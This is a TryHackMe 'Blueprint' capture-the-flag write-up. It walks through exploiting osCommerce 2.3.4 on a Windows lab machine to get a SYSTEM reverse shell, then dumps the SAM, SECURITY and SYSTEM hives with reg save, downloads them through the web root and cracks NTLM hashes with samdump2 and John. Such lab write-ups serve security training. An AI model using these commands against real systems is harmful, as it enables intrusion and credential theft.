# Blueprint – TryHackMe Writeup

## Overview

| Attribute   | Value                                |
| ----------- | ------------------------------------ |
| Platform    | TryHackMe                            |
| Room Name   | Blueprint                            |
| Difficulty  | Easy                                 |
| Target OS   | Windows                              |
| Attack Type | Web Exploitation → System Compromise |
| Author      | Shlok Jitendra Yadav                 |

---

# Objective

The goal of this room is to:

1. Perform reconnaissance and service enumeration.
2. Identify vulnerable services.
3. Exploit a vulnerable web application.
4. Gain a reverse shell on the target machine.
5. Extract Windows password hashes.
6. Crack the password offline.

---

# Attack Flow

```
Reconnaissance
      ↓
Service Enumeration
      ↓
Web Application Discovery
      ↓
osCommerce RCE Exploit
      ↓
Reverse Shell (SYSTEM Access)
      ↓
Registry Hive Extraction
      ↓
Password Hash Extraction
      ↓
Offline Password Cracking
```

---

# 1. Reconnaissance & Enumeration

## Target Machine

The target IP address is obtained from the TryHackMe dashboard.

Example:

```
10.10.x.x
```

---

## Nmap Scan

A full port scan with service detection was performed.

```bash
nmap -sC -sV -p- <TARGET_IP>
```

### Identified Open Ports

| Port | Service |
| ---- | ------- |
| 80   | HTTP    |
| 443  | HTTPS   |
| 139  | SMB     |
| 445  | SMB     |
| 3306 | MySQL   |
| 8080 | HTTP    |

The presence of multiple web services and SMB suggests potential attack vectors.

---

# 2. Web Enumeration

Accessing the web server revealed an application running on port **8080**.

```
http://<TARGET_IP>:8080
```

During directory enumeration the following directory was identified:

```
/oscommerce-2.3.4/
```

The version **osCommerce 2.3.4** is known to contain a **Remote Code Execution (RCE) vulnerability**.

---

# 3. Exploitation

## Searching for Public Exploits

The exploit database was queried using Searchsploit.

```bash
searchsploit oscommerce 2.3.4
```

Result:

```
osCommerce 2.3.4 Remote Code Execution
Exploit DB ID: 47206
```

---

## Exploit Modification

The public exploit is designed for **Linux targets**, while the Blueprint machine is **Windows**.

Adjustments required:

* Replace Linux commands with Windows-compatible commands.
* Use a PHP reverse shell payload.
* Construct a multi-line payload to avoid escaping issues.

Payload objective:

```
Write a malicious binary to:

C:\Windows\Temp
```

---

# 4. Reverse Shell Access

Before executing the exploit, a Netcat listener was started.

```bash
nc -lvnp 4444
```

The exploit script was then executed against the target application.

```bash
python exploit.py
```

Target URL:

```
http://<TARGET_IP>:8080/oscommerce-2.3.4/
```

After execution, the reverse shell connected successfully.

---

## Obtained Shell

```
nt authority\system
```

This indicates full administrative privileges on the machine.

---

# 5. Post Exploitation

## Locate Root Flag

The root flag is located in the Administrator desktop directory.

```
C:\Users\Administrator\Desktop\root.txt.txt
```

---

# 6. Registry Hive Extraction

The SAM file is locked when Windows is running.
Therefore registry backups must be created.

Execute the following commands:

```cmd
reg save hklm\sam sam
reg save hklm\security security
reg save hklm\system system
```

These commands dump the registry hives required for password extraction.

---

# 7. Data Exfiltration

To retrieve the dumped files, they were moved to the web server directory.

Example location:

```
C:\xampp\htdocs\oscommerce-2.3.4\catalog\
```

The files can then be downloaded through the browser.

Example:

```
http://<TARGET_IP>:8080/oscommerce-2.3.4/catalog/sam
```

---

# 8. Password Hash Extraction

On the attacking machine, extract NTLM hashes using samdump2.

```bash
samdump2 system sam
```

This produces password hashes for local Windows users.

---

# 9. Password Cracking

The NTLM hash for the user `lab` can be cracked using tools like:

* John the Ripper
* Hashcat
* CrackStation

Example with John:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

After cracking the hash, the plaintext password is revealed.

---

# Tools Used

| Tool                      | Purpose                |
| ------------------------- | ---------------------- |
| Nmap                      | Network scanning       |
| Searchsploit              | Exploit discovery      |
| Netcat                    | Reverse shell listener |
| Python                    | Exploit execution      |
| samdump2                  | Extract NTLM hashes    |
| John the Ripper / Hashcat | Password cracking      |

---

# MITRE ATT&CK Mapping

| Technique | Description                       |
| --------- | --------------------------------- |
| T1046     | Network Service Discovery         |
| T1190     | Exploit Public-Facing Application |
| T1059     | Command Execution                 |
| T1105     | Exfiltration Over Web Services    |
| T1003     | Credential Dumping                |

---

# Key Security Lessons

* Vulnerable web applications can lead to full system compromise.
* Proper patch management is critical for publicly exposed services.
* Windows credential storage can be extracted via registry hive dumps.
* Offline password cracking remains a powerful post-exploitation technique.

---

# Author

Shlok Jitendra Yadav
Cybersecurity Student

GitHub:
https://github.com/Shlokultra

---

# Disclaimer

This writeup is created for educational purposes only.
All activities were performed in a controlled lab environment provided by TryHackMe.
